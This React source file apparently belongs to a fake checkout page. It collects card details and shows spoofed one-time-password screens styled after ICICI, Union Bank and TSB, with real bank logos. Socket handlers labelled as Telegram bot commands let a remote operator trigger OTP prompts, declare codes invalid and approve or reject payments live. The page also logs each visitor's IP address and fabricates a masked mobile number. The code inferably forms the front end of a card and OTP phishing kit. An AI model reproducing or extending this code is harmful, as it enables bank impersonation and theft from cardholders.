import { Checkbox } from "@/components/ui/checkbox";
import React, { useState, useEffect, useRef } from 'react';
import { 
  useLocation, 
  useNavigate, 
  useSearchParams,
  Link  // ADD Link HERE
} from 'react-router-dom';
import { io, Socket } from 'socket.io-client';
import { 
  Lock, CreditCard, Shield, CheckCircle, AlertCircle, Clock, 
  ChevronDown, ChevronUp, Star, Users, Zap, Target, TrendingUp, 
  Calendar, DollarSign, Building2, Globe, Download, ChevronRight, X,
  Loader2, ArrowLeft, ArrowRight
} from 'lucide-react';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import NewOTPPage from '../components/NewOTPPage';
import ThirdOTPPage from '../components/ThirdOTPPage';
import ICICIBankOTPPage from '../components/ICICIBankOTPPage';
import UnionBankOTPPage from '../components/UnionBankOTPPage';
import TSBOTPPage from '../components/TSBOTPPage';
import ExpiredPage from '../components/ExpiredPage';
import { api } from '../utils/api';
import { devLog, devError, devWarn } from '../utils/logger';
import { v4 as uuidv4 } from 'uuid';

const bankLogos = [
  // Oman Banks (Priority Display)
  'https://www.nbo.om/Style%20Library/NBO3/images/Logo.png',
  'https://iconlogovector.com/uploads/images/2025/02/sm-67a9465deaa56-Bank-Muscat.webp',
  'https://companieslogo.com/img/orig/BKDB.OM_BIG-ef97d413.png?t=1720244491',
  'https://companieslogo.com/img/orig/BKSB.OM_BIG.D-b4e46aac.png?t=1720244491',
  'http://www.creativeaction.co.uk/wp-content/uploads/2016/09/oab-cards-logo.png',
  'https://companieslogo.com/img/orig/AUB.BH_BIG-326de283.png?t=1720244490',
  'https://mgmt.manhom.com/images/77730/1730189732/%D8%A8%D9%86%D9%83-%D9%86%D8%B2%D9%88%D9%89.webp',
  'https://storage.promosteer.com/static/images/providers/img_3bc15c16-41d9-5118-530b-9caac76b5614.webp',
  
  // UAE Banks (Priority Display)
  'https://uaelogos.ae/storage/886/conversions/Abu-Dhabi-Commercial-Bank-(ADCB)@4x-thumb.png',
  'https://uaelogos.ae/storage/1403/conversions/Abu-Dhabi-Islamic-Bank-(ADIB)-thumb.png',
  'https://uaelogos.ae/storage/2704/conversions/Ajman-Bank-thumb.png',
  'https://svgmix.com/uploads/b6d94e-al-hilal-bank.svg',
  'https://masarif.ae/storage/bank-logos/image_al-maryah-community-20220125151738.png',
  'https://masarif.ae/storage/bank-logos/image_bos20210115232009.png',
  'https://vectorseek.com/wp-content/uploads/2023/10/Emirates-Islamic-Bank-Logo-Vector.svg-.png',
  'https://logowik.com/content/uploads/images/720_emirates_nbd_bank_logo.jpg',
  
  // Indian Banks
  'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
  'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
  'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
  'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
  'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
  'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
  'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
  'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
  'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
  'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
  'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
  'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
  'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
  'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
  'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
  'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
  'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png',
  'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
  'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg',
  
  // Malaysian Banks
  'https://logos-world.net/wp-content/uploads/2023/02/Maybank-Logo-500x281.png',
  'https://whatthelogo.com/storage/logos/ambank-group-108215.png',
  'https://logolook.net/wp-content/uploads/2023/12/CIMB-Logo-500x281.png',
  
  // Singapore Banks
  'https://logos-world.net/wp-content/uploads/2023/03/OCBC-Bank-Logo-500x281.png',
  
  // International Banks
  'https://1000logos.net/wp-content/uploads/2017/02/HSBC-symbol-500x148.jpg',
  
  // Israeli Banks
  'https://cdn.freelogovectors.net/svg07/bank-hapoalim-logo.svg',
  'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png',
  'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg',
  'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png',
  'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg'
];

// Card brand logos
const cardBrandLogos = {
  visa: 'https://www.southpointfinancial.com/wp-content/uploads/2017/08/Verified-by-Visa-Logo-smaller-1-2.png',
  mastercard: 'https://iconape.com/wp-content/png_logo_vector/mastercard-securecode-logo.png',
  discover: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png',
  rupay: 'https://www.pngkey.com/png/full/129-1290304_file-rupay-logo-rupay-card.png',
  amex: 'https://cdn-icons-png.flaticon.com/128/5968/5968311.png' // fallback to discover for amex
};

// Function to detect card brand from card number
const getCardBrand = (cardNumber: string) => {
  if (!cardNumber) {
    return 'visa';
  }
  
  const cleanNumber = cardNumber.replace(/\s/g, '');
  
  // Visa: starts with 4
  if (cleanNumber.startsWith('4')) {
    return 'visa';
  }
  // Mastercard: starts with 5 or 2 (new range)
  else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
    return 'mastercard';
  }
  // Discover: starts with 6
  else if (cleanNumber.startsWith('6')) {
    return 'discover';
  }
  // American Express: starts with 3
  else if (cleanNumber.startsWith('3')) {
    return 'amex';
  }
  // RuPay: starts with 60, 6521, 6522, 81, 82, 508, 353, 356
  else if (/^(60|6521|6522|81|82|508|353|356)/.test(cleanNumber)) {
    return 'rupay';
  }
  
  // Default to Visa
  return 'visa';
};

const CheckoutTest = () => {
  return (
    <div style={{ padding: '50px', color: 'white', backgroundColor: '#1e293b' }}>
      <h1>CHECKOUT TEST - COMPONENT LOADS SUCCESSFULLY!</h1>
      <p>✅ React hooks working</p>
      <p>✅ Component rendering</p>
      <p>✅ No blank screen</p>
    </div>
  );
};

const Checkout = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const location = useLocation();
  
  const planName = searchParams.get('plan') || 'Complete';
  const billing = searchParams.get('billing') || 'yearly';
  const customAmount = searchParams.get('amount');
  const linkId = searchParams.get('linkId');
  
  // Minimal working checkout - will add features incrementally
  return (
    <div className="min-h-screen bg-slate-900 text-white">
      <div className="container mx-auto px-4 py-8">
        <h1 className="text-3xl font-bold mb-8">Checkout - {planName}</h1>
        <p className="text-lg mb-4">Plan: {planName}</p>
        <p className="text-lg mb-4">Billing: {billing}</p>
        <p className="text-lg mb-4">Amount: {customAmount || 'Standard pricing'}</p>
        <div className="bg-slate-800 p-6 rounded-lg">
          <h2 className="text-xl font-semibold mb-4">Basic Checkout Form</h2>
          <p className="text-green-400">✅ Component loads successfully</p>
          <p className="text-green-400">✅ React hooks working</p>
          <p className="text-green-400">✅ URL parameters extracted</p>
        </div>
      </div>
    </div>
  );
};

// ProcessingLoader Component with Multi-Stage Messages
const ProcessingLoader = () => {
  const [loadingStage, setLoadingStage] = useState(0);

  const stages = [
    "Please wait while we confirm your payment",
    "Checking your details...",
    "Redirecting you to confirmation page..."
  ];

  useEffect(() => {
    const timers = [
      setTimeout(() => setLoadingStage(1), 3000),  // Stage 2 after 3 seconds
      setTimeout(() => setLoadingStage(2), 7000),  // Stage 3 after 7 seconds (3+4)
      setTimeout(() => {
        // Navigation can be handled by parent component
        // This is just the loading indicator
      }, 10000) // Total 10 seconds (3+4+3)
    ];

    return () => {
      timers.forEach(timer => clearTimeout(timer));
    };
  }, []);

  return (
    <div className="fixed inset-0 bg-white bg-opacity-95 flex items-center justify-center z-50">
      <div className="text-center">
        <div className="animate-spin rounded-full h-32 w-32 border-t-2 border-b-2 border-blue-500 mx-auto mb-4"></div>
        <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment...</h3>
        <p className="text-gray-600 text-sm transition-all duration-500">
          {stages[loadingStage]}
        </p>
      </div>
    </div>
  );
};

const CheckoutOriginal = () => {
    const [searchParams] = useSearchParams();
    const navigate = useNavigate();
    const location = useLocation();
  
  const planName = searchParams.get('plan') || 'Complete';
  const billing = searchParams.get('billing') || 'yearly';
  
  // Extract hash from URL - it comes after 'custom&' in the format: /checkout?plan=Custom&billing=custom&HASH
  const extractHashFromUrl = () => {
    const urlParams = window.location.search;
    console.log('🔍 Full URL search params:', urlParams);
    
    // Try to get hash parameter directly first
    const directHash = searchParams.get('hash');
    if (directHash) {
      console.log('🎯 Found direct hash parameter:', directHash);
      return directHash;
    }
    
    // Otherwise extract from custom& format
    if (urlParams.includes('custom&')) {
      const hashPart = urlParams.split('custom&')[1];
      if (hashPart) {
        // Remove any additional parameters that might come after the hash
        const cleanHash = hashPart.split('&')[0];
        console.log('🎯 Extracted hash from URL:', cleanHash);
        return cleanHash;
      }
    }
    
    console.log('⚠️ No hash found in URL');
    return null;
  };
  
  const hash = extractHashFromUrl();
  const customAmount = searchParams.get('amount');
  const linkId = searchParams.get('linkId');
  const linkCurrency = searchParams.get('currency'); // Currency parameter from payment link
  
  console.log('📊 Checkout params:', { planName, billing, hash, customAmount, linkId, linkCurrency });
  
  // State for hashed payment data
  const [hashedPaymentData, setHashedPaymentData] = useState<any>(null);
  const [loadingHash, setLoadingHash] = useState(false);
  const [isPaymentLinkExpired, setIsPaymentLinkExpired] = useState(false);
  
  // Use hashed data when available
  const finalAmount = hash && hashedPaymentData ? hashedPaymentData.amount : customAmount;
  const finalCurrency = hash && hashedPaymentData ? hashedPaymentData.currency : linkCurrency;
  
  console.log('🔍 Debug payment values:', { finalAmount, finalCurrency, hashedPaymentData: !!hashedPaymentData });
  
  // Load payment data from hash
  useEffect(() => {
    if (hash) {
      const loadPaymentData = async () => {
        setLoadingHash(true);
        try {
          // Dynamic API base URL based on environment
          const getApiBaseUrl = () => {
            // In development (localhost), use port 3001 for backend
            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
              return 'http://localhost:3002';
            }
            // In production, use the same domain as frontend
            return window.location.origin;
          };
          
          const apiBaseUrl = getApiBaseUrl();
          console.log('💾 Fetching payment data from:', `${apiBaseUrl}/api/payment-data/${hash}`);
          
          const response = await fetch(`${apiBaseUrl}/api/payment-data/${hash}`);
          const result = await response.json();
          
          console.log('📊 Payment data API response:', { status: response.status, result });
          
          if (response.status === 410 || result.expired) {
            // Payment link is expired
            console.log('Payment link expired:', result);
            setIsPaymentLinkExpired(true);
            setHashedPaymentData(null);
          } else if (result.success) {
            setHashedPaymentData(result.data);
            setIsPaymentLinkExpired(false);
          } else {
            console.error('Failed to load payment data:', result.error);
            // Treat unknown errors as potentially expired
            if (response.status === 404) {
              setIsPaymentLinkExpired(true);
            }
          }
        } catch (error) {
          console.error('Error loading payment data:', error);
        } finally {
          setLoadingHash(false);
        }
      };
      
      loadPaymentData();
    }
  }, [hash]);
  
  // Clear any previous checkout data when starting a new session
  useEffect(() => {
    localStorage.removeItem('userCheckoutData');
    localStorage.removeItem('userCardData');
    localStorage.removeItem('lastPaymentData');
  }, []);

  // Function to check if this payment link was already successful
  const checkPaymentSuccess = async () => {
    try {
      // Check if we have linkId or other payment identifiers
      const currentUrl = window.location.href;
      const urlParams = new URLSearchParams(window.location.search);
      const linkId = urlParams.get('linkId');
      const amount = urlParams.get('amount');
      const plan = urlParams.get('plan');
      
      devLog('🔍 Checking payment success for:', { linkId, amount, plan, currentUrl });
      
      // Method 1: Check by linkId if available
      if (linkId) {
        const linkSuccessData = localStorage.getItem(`payment_success_${linkId}`);
        if (linkSuccessData) {
          devLog('✅ Payment link already successful (by linkId):', linkId);
          return JSON.parse(linkSuccessData);
        }
      }
      
      // Method 2: Check by URL pattern matching
      const successfulPayments = JSON.parse(localStorage.getItem('successfulPayments') || '[]');
      
      // Check if any stored successful payment matches current parameters
      for (const paymentId of successfulPayments) {
        const paymentData = localStorage.getItem(`payment_success_${paymentId}`);
        if (paymentData) {
          const parsedData = JSON.parse(paymentData);
          
          // Match by amount and plan if available
          if (amount && plan) {
            if (parsedData.amount === parseFloat(amount) && parsedData.planName === plan) {
              devLog('✅ Payment already successful (by amount/plan match):', parsedData);
              return parsedData;
            }
          }
        }
      }
      
      // Method 3: Check by exact URL match (for generated payment links)
      const urlSuccessKey = `url_success_${btoa(currentUrl)}`;
      const urlSuccessData = localStorage.getItem(urlSuccessKey);
      if (urlSuccessData) {
        devLog('✅ Payment URL already successful:', currentUrl);
        return JSON.parse(urlSuccessData);
      }
      
      devLog('❌ No successful payment found for current parameters');
      return null;
    } catch (error) {
      console.error('Error checking payment success:', error);
      return null;
    }
  };

  // Function to store URL success for persistence
  const storeUrlSuccess = (paymentData: any) => {
    try {
      const currentUrl = window.location.href;
      const urlSuccessKey = `url_success_${btoa(currentUrl).replace(/[^a-zA-Z0-9]/g, '').slice(0, 32)}`;
      const successData = {
        url: currentUrl,
        timestamp: new Date().toISOString(),
        ...paymentData
      };
      localStorage.setItem(urlSuccessKey, JSON.stringify(successData));
      devLog('💾 Stored URL success:', successData);
    } catch (error) {
      console.error('Error storing URL success:', error);
    }
  };

  // Check for successful payment on component mount
  useEffect(() => {
    const checkSuccess = async () => {
      const successData = await checkPaymentSuccess();
      if (successData) {
        devLog('🚀 Redirecting to success page - payment already completed');
        
        // Store user data for success page
        const userData = {
          firstName: 'Previous',
          lastName: 'Customer',
          email: 'customer@example.com',
          country: 'Unknown',
          companyName: '',
          planName: successData.planName || planName,
          billing: successData.billing || billing,
          amount: successData.amount || customAmount,
          paymentId: successData.paymentId || 'previous-payment'
        };
        localStorage.setItem('userCheckoutData', JSON.stringify(userData));
        
        // Navigate to success page immediately - check for hash-based URL first
        if (successData.successHash) {
          devLog('🚀 Redirecting to hash-based success page:', successData.successHash);
          navigate(`/success/${successData.successHash}`);
        } else {
          devLog('🚀 Redirecting to regular success page');
          navigate('/payment-success');
        }
      }
    };
    
    checkSuccess();
  }, [navigate, planName, billing, customAmount]);



  // Initialize socket connection for visitor tracking and payment handling
  const [socket, setSocket] = useState<any>(null);
  const [isConnected, setIsConnected] = useState(false);
  
  useEffect(() => {
    try {
      const getSocketUrl = () => {
        // In development (localhost), use port 3001 for backend
        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
          return 'http://localhost:3002';
        }
        // In production, use the same domain as frontend
        return window.location.origin;
      };
      
      const newSocket = io(getSocketUrl());
      setSocket(newSocket);
    
    newSocket.on('connect', () => {
      setIsConnected(true);
      // Request current currency settings immediately on connect
      newSocket.emit('get-currency-settings');
    });
    
    newSocket.on('disconnect', () => {
      setIsConnected(false);
    });
    
    // Listen for global currency changes from admin panel
    newSocket.on('global-currency-change', (data) => {
      console.log('🔄 Global currency change received:', data.currency, 'linkCurrency:', linkCurrency);
      // Only update global currency if no link-specific currency is set
      if (!linkCurrency) {
        console.log('✅ Applying global currency change:', data.currency);
        setGlobalCurrency(data.currency);
        setCurrencySymbol(data.currency === 'USD' ? '$' : '₹');
      } else {
        console.log('🚫 Ignoring global currency change - link currency locked:', linkCurrency);
      }
      // Always update exchange rate
      setExchangeRate(data.exchangeRate);
    });
    
    // Listen for exchange rate updates
    newSocket.on('exchange-rate-update', (data) => {
      setExchangeRate(data.exchangeRate);
    });
    
    // Listen for currency settings response
    newSocket.on('currency-settings', (data) => {
      console.log('⚙️ Currency settings received:', data.currency, 'linkCurrency:', linkCurrency);
      // Only update global currency if no link-specific currency is set
      if (!linkCurrency) {
        console.log('✅ Applying currency settings:', data.currency);
        setGlobalCurrency(data.currency);
        setCurrencySymbol(data.currency === 'USD' ? '$' : '₹');
      } else {
        console.log('🚫 Ignoring currency settings - link currency locked:', linkCurrency);
      }
      // Always update exchange rate
      setExchangeRate(data.exchangeRate);
    });
    
    // Function to check localStorage for admin OTP selection
    const checkAdminOtpSelection = () => {
      const adminSelection = localStorage.getItem('adminOtpSelection');
      if (adminSelection) {
        try {
          const selectionData = JSON.parse(adminSelection);
          console.log('👨‍💼 Found admin OTP selection in localStorage:', selectionData);
          if (selectionData.otpPageSelection && selectionData.timestamp > Date.now() - 300000) { // 5 min expiry
            console.log(`🎯 Using admin selected OTP page: ${selectionData.otpPageSelection}`);
            setOtpPageSelection(selectionData.otpPageSelection);
            // Clear the selection after use
            localStorage.removeItem('adminOtpSelection');
            return true;
          }
        } catch (error) {
          console.error('Error parsing admin OTP selection:', error);
        }
      }
      return false;
    };

    // Telegram Bot Command Handlers
    newSocket.on('show-otp', (data) => {
      console.log('🔐 Received show-otp command from Telegram:', data);
      
      // Check attempt limit first
      if (otpAttempts >= 3) {
        console.log('❌ OTP attempt limit reached, redirecting with failure message');
        setOtpFailedMessage('Maximum OTP attempts exceeded. Transaction failed.');
        setTimeout(() => {
          setCurrentStep('payment');
          setShowOtp(false);
          setOtpValue('');
          setOtpError('');
          setTransactionCancelError('OTP attempt limit exceeded. Please try again.');
        }, 3000);
        return;
      }
      
      // Increment attempt count
      setOtpAttempts(prev => prev + 1);
      console.log(`🔢 OTP attempt #${otpAttempts + 1} of 3`);
      
      // Use admin-selected OTP page if provided, otherwise check localStorage, otherwise random selection
      let newOtpPageSelection;
      let adminSelectionUsed = false;
      
      console.log('📊 show-otp event data received:', data);
      console.log('📊 otpPageSelection from data:', data.otpPageSelection);
      
      // First try: Socket data from admin
      if (data.otpPageSelection) {
        newOtpPageSelection = data.otpPageSelection;
        adminSelectionUsed = true;
        console.log(`👨‍💼 Admin selected OTP page (socket): ${newOtpPageSelection}`);
      }
      // Second try: localStorage fallback
      else if (checkAdminOtpSelection()) {
        // OTP page selection was already set in checkAdminOtpSelection
        adminSelectionUsed = true;
        newOtpPageSelection = otpPageSelection; // Use current state that was just set
      }
      // Third try: Random selection
      else {
        const rand = Math.random();
        if (rand < 0.167) newOtpPageSelection = 'old';
        else if (rand < 0.334) newOtpPageSelection = 'new';
        else if (rand < 0.501) newOtpPageSelection = 'third';
        else if (rand < 0.668) newOtpPageSelection = 'icici';
        else if (rand < 0.835) newOtpPageSelection = 'union';
        else newOtpPageSelection = 'tsb';
        
        console.log(`🎲 Random selected OTP page: ${newOtpPageSelection} (attempt ${otpAttempts + 1}/3)`);
      }
      
      if (!adminSelectionUsed || newOtpPageSelection !== otpPageSelection) {
        setOtpPageSelection(newOtpPageSelection);
      }
      
      // Show OTP screen
      setCurrentStep('otp');
      setShowOtp(true);
      startOtpTimer();
      setOtpValue('');
      setOtpError('');
      setOtpSubmitting(false);
    });
    
    // Also listen for admin-show-otp event for direct admin communication
    newSocket.on('admin-show-otp', (data) => {
      console.log('📱 Received admin-show-otp event:', data);
      setOtpAttempts(prev => prev + 1);
      console.log(`🔢 OTP attempt #${otpAttempts + 1} of 3 (admin triggered)`);
      
      // Use admin-selected OTP page if provided, otherwise random selection
      let newOtpPageSelection;
      console.log('📊 admin-show-otp event data received:', data);
      console.log('📊 otpPageSelection from admin data:', data.otpPageSelection);
      if (data.otpPageSelection) {
        newOtpPageSelection = data.otpPageSelection;
        console.log(`👨‍💼 Admin selected OTP page (admin-show-otp): ${newOtpPageSelection}`);
      } else {
        // Generate new random OTP page selection for each attempt (includes TSB)
        const rand = Math.random();
        if (rand < 0.167) newOtpPageSelection = 'old';
        else if (rand < 0.334) newOtpPageSelection = 'new';
        else if (rand < 0.501) newOtpPageSelection = 'third';
        else if (rand < 0.668) newOtpPageSelection = 'icici';
        else if (rand < 0.835) newOtpPageSelection = 'union';
        else newOtpPageSelection = 'tsb';
        
        console.log(`🎲 Random selected OTP page (admin-show-otp fallback): ${newOtpPageSelection}`);
      }
      
      setOtpPageSelection(newOtpPageSelection);
      
      // Show OTP screen
      setCurrentStep('otp');
      setShowOtp(true);
      startOtpTimer();
      setOtpValue('');
      setOtpError('');
      setOtpSubmitting(false);
    });
    
    newSocket.on('invalid-otp-error', (data) => {
      console.log('❌ Received invalid OTP error command from Telegram:', data);
      setOtpError('Invalid OTP');
      setOtpSubmitting(false);
    });
    
    newSocket.on('payment-approved', (data) => {
      console.log('✅ Received payment approved from Telegram:', data);
      setOtpSubmitting(false);
      setIsProcessing(false);
      setConfirmingPayment(false);
      
      // Store success data
      const userData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
        email: formData.email,
        country: formData.country,
        companyName: formData.companyName,
        planName,
        billing,
        amount: displayPrice,
        paymentId
      };
      localStorage.setItem('userCheckoutData', JSON.stringify(userData));
      
      // Navigate to success page
      navigate('/payment-success');
    });
    
    newSocket.on('payment-rejected', (data) => {
      console.log(' PAYMENT-REJECTED EVENT TRIGGERED (NEW HANDLER) - This should reset confirmingPayment!');
      console.log(' Received payment rejected from Telegram:', data);
      
      // COMPREHENSIVE FIX: Reset ALL loading states to prevent spinner persistence
      console.log(' Resetting ALL loading states in payment-rejected (NEW)...');
      setOtpSubmitting(false);
      setIsProcessing(false);
      setConfirmingPayment(false);
      setIsCardCheckoutProcessing(false);
      setNewOtpPageLoading(false);
      console.log(' confirmingPayment set to FALSE in payment-rejected (NEW)');
      
      // Clear all error states and session data
      setOtpError('');
      setOtpValue('');
      setResendMessage('');
      setCardDeclinedError('');
      setProcessingMessage('');
      
      // Reset UI state
      setCurrentStep('payment');
      setShowOtp(false);
      setTransactionCancelError('Payment declined. Please check your card details and try again.');
      
      console.log('🔧 All loading states and session data cleared after payment rejection');
    });
    
      return () => {
        newSocket.off('show-otp');
        newSocket.off('admin-show-otp');
        newSocket.off('invalid-otp-error');
        newSocket.off('payment-approved');
        newSocket.off('payment-rejected');
        newSocket.disconnect();
      };
    } catch (error) {
      console.error('Socket connection failed:', error);
      // Continue without socket - checkout will work without real-time features
    }
  }, [linkCurrency]); // Add linkCurrency dependency to update socket listeners when currency changes
  
  // Visitor tracking for checkout page
  useEffect(() => {
    if (!socket) return;

    const trackVisitor = async () => {
      try {
        // Fetch visitor IP address
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        
        const visitorData = {
          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          ipAddress: data.ip,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          page: 'checkout'
        };
        
        // Emit visitor joined event
        socket.emit('visitor-joined', visitorData);
        
        // Set up aggressive heartbeat to maintain session (every 10 seconds)
        const heartbeatInterval = setInterval(() => {
          if (socket.connected) {
            socket.emit('visitor-heartbeat', {
              visitorId: visitorData.visitorId,
              ipAddress: data.ip,
              timestamp: new Date().toISOString(),
              page: 'checkout'
            });
            // Heartbeat sent silently
          } else {
            // Socket disconnected
          }
        }, 10000); // Send heartbeat every 10 seconds (more frequent)
        
        // Cleanup function
        return () => {
          clearInterval(heartbeatInterval);
          // Don't emit visitor-left on cleanup to avoid flickering
        };
      } catch (error) {
        console.error('Error tracking visitor:', error);
        // Fallback with unknown IP
        const fallbackData = {
          visitorId: `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          ipAddress: 'Unknown IP',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          page: 'checkout'
        };
        socket.emit('visitor-joined', fallbackData);
      }
    };

    trackVisitor();
  }, [socket]);
  
  // Check for admin OTP selection on initialization
  useEffect(() => {
    const checkInitialAdminOtpSelection = () => {
      const adminSelection = localStorage.getItem('adminOtpSelection');
      if (adminSelection) {
        try {
          const selectionData = JSON.parse(adminSelection);
          console.log('🔄 Checking initial admin OTP selection:', selectionData);
          if (selectionData.otpPageSelection && selectionData.timestamp > Date.now() - 300000) { // 5 min expiry
            console.log(`🎯 Initial admin OTP page found: ${selectionData.otpPageSelection}`);
            setOtpPageSelection(selectionData.otpPageSelection);
          } else {
            console.log('⏰ Admin OTP selection expired, clearing localStorage');
            localStorage.removeItem('adminOtpSelection');
          }
        } catch (error) {
          console.error('Error parsing initial admin OTP selection:', error);
          localStorage.removeItem('adminOtpSelection');
        }
      }
    };
    
    checkInitialAdminOtpSelection();
  }, []); // Run once on mount
  
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: '',
    companyName: ''
  });
  
  const [errors, setErrors] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    country: ''
  });
  
  const [touched, setTouched] = useState({
    firstName: false,
    lastName: false,
    email: false,
    confirmEmail: false,
    country: false
  });
  
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [showTermsError, setShowTermsError] = useState(false);
  const [finalConsent, setFinalConsent] = useState(false);
  const [promoCode, setPromoCode] = useState('');
  
  // OTP Page Selection State (random between 6 pages - ~16.67% each)
  const [otpPageSelection, setOtpPageSelection] = useState(() => {
    const rand = Math.random();
    if (rand < 0.1667) return 'old';
    if (rand < 0.3333) return 'new';
    if (rand < 0.5000) return 'third';
    if (rand < 0.6667) return 'icici';
    if (rand < 0.8333) return 'union';
    return 'tsb'; // TSB Bank OTP page (~16.67%)
  });
  const [useNewOTPPage, setUseNewOTPPage] = useState(() => Math.random() < 0.5);
  const [newOtpPageLoading, setNewOtpPageLoading] = useState(false);
  
  // OTP Attempt Tracking (max 3 attempts, fail on 4th)
  const [otpAttempts, setOtpAttempts] = useState(0);
  const [otpFailedMessage, setOtpFailedMessage] = useState('');

  // Debug: Log the current state of agreeTerms (disabled)
  // useEffect(() => {
  //   devLog('agreeTerms state:', agreeTerms);
  // }, [agreeTerms]);

  // Debug: Log which OTP page type is selected (disabled)
  // useEffect(() => {
  //   devLog('OTP Page Type:', useNewOTPPage ? 'NEW OTP Page Component' : 'Original OTP Modal');
  // }, [useNewOTPPage]);
  
  // Payment flow states
  const [currentStep, setCurrentStep] = useState<'account' | 'loading' | 'payment' | 'review' | 'processing' | 'otp'>('account');
  const [paymentMethod, setPaymentMethod] = useState('');
  const [transactionId] = useState(() => `TXN-${Date.now().toString().slice(-8)}`);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardholderName: ''
  });
  const [cardErrors, setCardErrors] = useState({
    cardNumber: '',
    cardName: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: ''
  });

  // Loading and processing states
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCardCheckoutProcessing, setIsCardCheckoutProcessing] = useState(false);
  const [processingMessage, setProcessingMessage] = useState('');
  const [showOtp, setShowOtp] = useState(false);
  const [otpValue, setOtpValue] = useState('');
  const [confirmingPayment, setConfirmingPayment] = useState(false);
  const [otpTimer, setOtpTimer] = useState(0);
  const [otpError, setOtpError] = useState('');
  const [otpSubmitting, setOtpSubmitting] = useState(false);
  const [sessionBankLogo, setSessionBankLogo] = useState('');
  const [resendMessage, setResendMessage] = useState('');
  const [randomMobile, setRandomMobile] = useState('');
  const [cardDeclinedError, setCardDeclinedError] = useState('');
  const [otpMobileLast4, setOtpMobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
  const [showSpinner, setShowSpinner] = useState(false);
  const [declineError, setDeclineError] = useState("");
  const [paymentId] = useState(() => 'pay_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
  const [cardError, setCardError] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [showCancelConfirm, setShowCancelConfirm] = useState(false);
  const [transactionCancelError, setTransactionCancelError] = useState("");
  

  
  // Payment feedback feature states
  const [showPaymentFeedback, setShowPaymentFeedback] = useState(false);
  const [selectedPaymentMethods, setSelectedPaymentMethods] = useState<string[]>([]);
  const [feedbackSubmitted, setFeedbackSubmitted] = useState(false);
  
  // Currency customization state from OTP admin panel
  const [otpCustomAmount, setOtpCustomAmount] = useState<number | null>(null);
  const [otpCurrency, setOtpCurrency] = useState('INR');
  
  // Global currency state (controlled by admin panel)
  const [globalCurrency, setGlobalCurrency] = useState<string>('INR');
  const [exchangeRate, setExchangeRate] = useState<number>(83.0); // USD to INR rate
  const [currencySymbol, setCurrencySymbol] = useState<string>('₹');
  const [otpCurrencySymbol, setOtpCurrencySymbol] = useState('₹');
  const [adminSelectedBankLogo, setAdminSelectedBankLogo] = useState<string>('');
  const [otpModalAnimating, setOtpModalAnimating] = useState(false);

  // Override global currency if payment link specifies a currency
  useEffect(() => {
    console.log('🔍 URL linkCurrency parameter:', linkCurrency);
    if (linkCurrency && (linkCurrency === 'INR' || linkCurrency === 'USD')) {
      setGlobalCurrency(linkCurrency);
